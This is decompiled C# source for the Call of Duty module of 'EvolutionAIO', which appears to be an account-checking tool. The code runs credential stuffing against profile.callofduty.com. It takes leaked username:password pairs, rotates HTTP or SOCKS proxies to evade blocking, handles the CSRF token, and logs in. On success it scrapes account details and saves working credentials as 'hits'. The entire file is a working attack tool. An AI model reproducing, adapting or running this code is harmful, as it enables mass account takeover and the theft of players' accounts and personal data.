// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.COD
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace EvolutionAIO.Checkers
{
  internal class COD
  {
    public static bool check(string[] s, string proxy)
    {
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
          httpRequest.AddHeader("Pragma", "no-cache");
          httpRequest.AddHeader("Accept", "*/*");
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          httpRequest.Get("https://profile.callofduty.com/cod-mobile/loginMobileGame?");
          CookieCollection cookies = httpRequest.Cookies.GetCookies("https://profile.callofduty.com/cod-mobile/loginMobileGame?");
          string content = "";
          foreach (Cookie cookie in cookies)
          {
            if (cookie.Name == "XSRF-TOKEN")
              content = cookie.Value;
          }
          Save.AsResult(nameof (COD), "TK", content);
          string str1 = "username=" + s[0] + "&password=" + s[1] + "&_csrf=" + content;
          httpRequest.AddHeader("Host", "profile.callofduty.com");
          httpRequest.AddHeader("Connection", "keep-alive");
          httpRequest.AddHeader("Origin", "https://profile.callofduty.com");
          httpRequest.AddHeader("DNT", "1");
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
          httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
          httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
          httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
          httpRequest.AddHeader("Sec-Fetch-Dest", "document");
          httpRequest.AddHeader("Referer", "https://profile.callofduty.com/cod-mobile/loginMobileGame");
          httpRequest.AddHeader("Accept-Language", "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7");
          httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
          httpRequest.Post("https://profile.callofduty.com/do_login?new_SiteId=cod-mobile", str1, "application/x-www-form-urlencoded");
          string str2 = "";
          string str3 = "";
          foreach (Cookie cookie in httpRequest.Cookies.GetCookies("https://profile.callofduty.com/do_login?new_SiteId=cod-mobile"))
          {
            if (cookie.Name == "ACT_SSO_EVENT")
              str2 = cookie.Value;
            if (cookie.Name == "ACT_SSO_COOKIE")
              str3 = cookie.Value;
          }
          if (str2.Contains("LOGIN_SUCCESS"))
          {
            httpRequest.AddHeader("Host", "profile.callofduty.com");
            httpRequest.AddHeader("Connection", "keep-alive");
            httpRequest.AddHeader("Accept", "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01");
            httpRequest.AddHeader("DNT", "1");
            httpRequest.AddHeader("X-XSRF-TOKEN", "n2sva09fcqBysY5hPA5d_WI9CgaNjfrkbwvpEANDXgpEhBrcjSek2ziXF4bGTKKG");
            httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
            httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
            httpRequest.AddHeader("Referer", "https://profile.callofduty.com/cod-mobile/mobileGameRegisterComplete?");
            httpRequest.AddHeader("Accept-Language", "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7");
            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
            HttpResponse httpResponse = httpRequest.Get("https://profile.callofduty.com/cod-mobile/userInfo/" + str3);
            string str4 = Menu.Parse(httpResponse.ToString(), "{\"userName\":\"", "\"");
            string str5 = Menu.Parse(httpResponse.ToString(), "emailValidated\":", ",\"");
            string str6 = Menu.Parse(httpResponse.ToString(), "gamerAccountLinked\":", ",\"");
            string str7 = Menu.Parse(httpResponse.ToString(), "{\"provider\":\"", "\",");
            string str8 = Menu.Parse(httpResponse.ToString(), "countryCode\":\"", "\",");
            ++Menu.hits;
            if (Menu.p1 == "2")
              Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1], Color.Green);
            Save.AsResult(nameof (COD), "Capture", s[0] + ":" + s[1] + " | Username: " + str4 + " ~ Email Verified: " + str5 + " ~ Linked Account: " + str6 + " ~ Platform: " + str7 + " ~ Country: " + str8);
            Save.AsResult(nameof (COD), "Hits", s[0] + ":" + s[1]);
            return false;
          }
          if (str2.Contains("LOGIN_FAILURE"))
            return false;
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        ++Menu.errors;
      }
      return false;
    }
  }
}
